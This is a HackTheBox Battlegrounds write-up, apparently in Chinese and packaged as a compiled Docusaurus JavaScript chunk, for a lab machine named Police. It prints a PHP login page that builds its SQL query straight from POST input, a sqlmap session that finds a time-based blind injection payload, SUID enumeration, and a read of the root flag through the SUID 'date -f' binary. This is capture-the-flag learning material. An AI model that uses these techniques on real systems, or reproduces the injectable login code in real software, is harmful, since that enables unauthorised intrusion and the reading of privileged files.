"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[5690],{62304:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>p,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"HackTheBox/Battlegrounds/Cyber Mayhem/Police","title":"Police","description":"\u4fe1\u606f\u641c\u96c6","source":"@site/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Police.md","sourceDirName":"HackTheBox/Battlegrounds/Cyber Mayhem","slug":"/HackTheBox/Battlegrounds/Cyber Mayhem/Police","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Police","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Police.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Myron","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Myron"},"next":{"title":"Triston","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Triston"}}');var a=t(74848),i=t(28453);const o={},r="Police",l={},c=[{value:"\u4fe1\u606f\u641c\u96c6",id:"\u4fe1\u606f\u641c\u96c6",level:2},{value:"Web Service SQL\u6ce8\u5165",id:"web-service-sql\u6ce8\u5165",level:2},{value:"\u63d0\u6743\u81f3 root",id:"\u63d0\u6743\u81f3-root",level:2}];function d(e){const n={code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"police",children:"Police"})}),"\n",(0,a.jsx)(n.h2,{id:"\u4fe1\u606f\u641c\u96c6",children:"\u4fe1\u606f\u641c\u96c6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"# \u76f4\u63a5 netstat -anopt \u770b\u672c\u673a\u7684\u5c31\u884c\n# \u6838\u5fc3 80 \u7aef\u53e3\n"})}),"\n",(0,a.jsx)(n.h2,{id:"web-service-sql\u6ce8\u5165",children:"Web Service SQL\u6ce8\u5165"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"http://10.10.110.101/police/\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(74798).A+"",width:"2560",height:"1371"})}),"\n",(0,a.jsx)(n.p,{children:"\u5ba1\u8ba1\u672c\u673a\u6e90\u7801"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",metastring:'title="/var/www/html/police/userlogin.php"',children:'<!DOCTYPE html>\n<html>\n<head>\n<?php\n\n\nif(isset($_POST[\'s\']))\n{\n    session_start();\n    $_SESSION[\'x\']=1;\n    $conn=mysqli_connect("localhost","root","","crime_portal");\n    if(!$conn)\n    {\n        die("could not connect".mysqli_error());\n    }\n    mysqli_select_db("crime_portal",$conn);\n\n    if($_SERVER["REQUEST_METHOD"]=="POST")\n    {\n        $name=$_POST[\'email\'];\n        $pass=$_POST[\'password\'];\n        $u_id=$_POST[\'email\'];\n        $_SESSION[\'u_id\']=$u_id;\n        $result=mysqli_query($conn,"SELECT u_id,u_pass FROM user where u_id=\'$name\'and u_pass=\'$pass\' ");\n\n\n\n\n        if(!$result || mysqli_num_rows($result)==0)\n        {\n          $message = "Id or Password not Matched.";\n          echo "<script type=\'text/javascript\'>alert(\'$message\');<\/script>";\n\n\n        }\n        else\n        {\n          header("location:complainer_page.php");\n\n        }\n    }\n}\n?>\n        <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">\n        <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">\n        <link href="http://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic,700italic" rel="stylesheet" type="text/css">\n\n    <script>\n     function f1()\n        {\n            var sta2=document.getElementById("exampleInputEmail1").value;\n            var sta3=document.getElementById("exampleInputPassword1").value;\n          var x2=sta2.indexOf(\' \');\nvar x3=sta3.indexOf(\' \');\n    if(sta2!="" && x2>=0){\n    document.getElementById("exampleInputEmail1").value="";\n    document.getElementById("exampleInputEmail1").focus();\n      alert("Space Not Allowed");\n        }\n        else if(sta3!="" && x3>=0){\n    document.getElementById("exampleInputPassword1").value="";\n    document.getElementById("exampleInputPassword1").focus();\n      alert("Space Not Allowed");\n        }\n\n}\n    <\/script>\n\n        <title>Complainant Login</title>\n</head>\n<body style="background-size: cover;\n    background-image: url(regi_bg.jpeg);\n    background-position: center;">\n        <nav class="navbar navbar-default navbar-fixed-top" style="height: 60px;">\n  <div class="container">\n    <div class="navbar-header">\n\n      <a class="navbar-brand" href="index.php" style="margin-top: 5%;"><b>Crime Portal</b></a>\n    </div>\n    <div id="navbar" class="collapse navbar-collapse">\n      <ul class="nav navbar-nav">\n        <li class="active" style="margin-top: 5%;"><a href="userlogin.php">Complainer Login</a></li>\n      </ul>\n\n\n    </div>\n  </div>\n </nav>\n <div  align="center">\n        <div class="form" style="margin-top: 15%">\n                <form method="post">\n  <div class="form-group" style="width: 30%">\n    <label for="exampleInputEmail1"><h1 style="color: #fff;">User Id</h1></label>\n    <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" size="5" placeholder="Enter Email id" required name="email" onfocusout="f1()">\n     </div>\n  <div class="form-group" style="width:30%">\n    <label for="exampleInputPassword1"><h1 style="color: #fff;">Password</h1></label>\n    <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" required name="password" onfocusout="f1()">\n  </div>\n\n  <button type="submit" class="btn btn-primary" name="s" onclick="f1()">Submit</button>\n</form>\n        </div>\n</div>\n<div style="position: fixed;\n   left: 0;\n   bottom: 0;\n   width: 100%;\n   background-color: rgba(0,0,0,0.7);\n   color: white;\n   text-align: center;">\n  <h4 style="color: white;">&copy <b>Crime Portal 2018</b></h4>\n</div>\n\n</body>\n</html>\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u5f88\u660e\u663e\u7684 sql \u6ce8\u5165"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sqlmap -u http://10.10.110.101/police/userlogin.php --form --batch\n        ___\n       __H__\n ___ ___[(]_____ ___ ___  {1.9.3#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 16:48:35 /2025-04-12/\n\n[16:48:35] [INFO] testing connection to the target URL\n[16:48:36] [INFO] searching for forms\n[1/1] Form:\nPOST http://10.10.110.101/police/userlogin.php\nPOST data: email=&password=&s=\ndo you want to test this form? [Y/n/q]\n> Y\nEdit POST data [default: email=&password=&s=] (Warning: blank fields detected): email=&password=&s=\ndo you want to fill blank fields with random values? [Y/n] Y\n[16:48:36] [INFO] using '/home/randark/.local/share/sqlmap/output/results-04122025_0448pm.csv' as the CSV results file in multiple targets mode\nyou have not declared cookie(s), while server wants to set its own ('PHPSESSID=2tvtinaafnr...a3q7k6s203'). Do you want to use those [Y/n] Y\n[16:48:36] [INFO] checking if the target is protected by some kind of WAF/IPS\n[16:48:37] [INFO] testing if the target URL content is stable\n[16:48:37] [INFO] target URL content is stable\n[16:48:37] [INFO] testing if POST parameter 'email' is dynamic\n[16:48:37] [WARNING] POST parameter 'email' does not appear to be dynamic\n[16:48:37] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable\n[16:48:38] [INFO] testing for SQL injection on POST parameter 'email'\n[16:48:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[16:48:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'\n[16:48:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'\n[16:48:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[16:48:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'\n[16:48:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[16:48:47] [INFO] testing 'Generic inline queries'\n[16:48:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'\n[16:48:49] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'\n[16:48:50] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'\n[16:48:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[16:49:02] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y\n[16:49:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[16:49:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\ngot a 302 redirect to 'http://10.10.110.101/police/complainer_page.php'. Do you want to follow? [Y/n] Y\nredirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N\n[16:49:11] [INFO] target URL appears to be UNION injectable with 2 columns\ninjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y\n[16:49:29] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')\n[16:49:29] [INFO] checking if the injection point on POST parameter 'email' is a false positive\nPOST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:\n---\nParameter: email (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: email=npai'AND (SELECT 1251 FROM (SELECT(SLEEP(5)))QMQw) AND'Vdae'='Vdae&password=YrVE&s=vpfQ\n---\ndo you want to exploit this SQL injection? [Y/n] Y\n[16:49:46] [INFO] the back-end DBMS is MySQL\n[16:49:46] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions\nweb server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)\nweb application technology: Apache 2.4.41, PHP\nback-end DBMS: MySQL >= 5.0.12\n[16:49:48] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/randark/.local/share/sqlmap/output/results-04122025_0448pm.csv'\n\n[*] ending @ 16:49:48 /2025-04-12/\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6ca1\u6709\u660e\u663e\u7684\u7ed3\u679c\u56de\u663e\uff0c\u4e5f\u6ca1\u6709\u62a5\u9519\uff0c\u53ea\u80fd\u4e0a\u65f6\u95f4\u76f2\u6ce8\uff0c\u53ef\u4ee5\u5f97\u5230\u7528\u6237\u5bc6\u7801"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"# Exercise 1v1 \u6a21\u5f0f\u4e0b\u4ec5 15min \u4e0d\u8db3\u4ee5\u8dd1\u5b8c\u65f6\u95f4\u76f2\u6ce8\uff0c\u8bf7\u6c42\u65f6\u95f4\u4e0d\u7a33\u5b9a\n......\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63d0\u6743\u81f3-root",children:"\u63d0\u6743\u81f3 root"}),"\n",(0,a.jsx)(n.p,{children:"\u68c0\u67e5suid\u6587\u4ef6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"eddie@htb:/var/www/html/police$ find / -perm -u=s -type f 2>/dev/null\n/usr/lib/openssh/ssh-keysign\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/snapd/snap-confine\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/eject/dmcrypt-get-device\n/usr/bin/chfn\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/at\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/pkexec\n/usr/bin/gpasswd\n/usr/bin/newuidmap\n/usr/bin/newgidmap\n/snap/core18/1997/bin/mount\n/snap/core18/1997/bin/ping\n/snap/core18/1997/bin/su\n/snap/core18/1997/bin/umount\n/snap/core18/1997/usr/bin/chfn\n/snap/core18/1997/usr/bin/chsh\n/snap/core18/1997/usr/bin/gpasswd\n/snap/core18/1997/usr/bin/newgrp\n/snap/core18/1997/usr/bin/passwd\n/snap/core18/1997/usr/bin/sudo\n/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/1997/usr/lib/openssh/ssh-keysign\n/snap/snapd/11588/usr/lib/snapd/snap-confine\n/snap/snapd/11402/usr/lib/snapd/snap-confine\n/bin/date\n/bin/fusermount\n/bin/su\n/bin/umount\n/bin/mount\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u76f4\u63a5\u4f7f\u7528",(0,a.jsx)(n.code,{children:"date"}),"\u6784\u9020\u6587\u4ef6\u8bfb\u53d6"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"eddie@htb:/var/www/html/police$ date -f /root/flag.txt\ndate: invalid date \u2018d18af8fa1a47ebe4e24a2b0acaa31aac\u2019\n"})})]})}function p(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},74798:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250403-170351-a6b26944de41ff7923f0ce9a40f4ff98.png"},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>r});var s=t(96540);const a={},i=s.createContext(a);function o(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:o(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);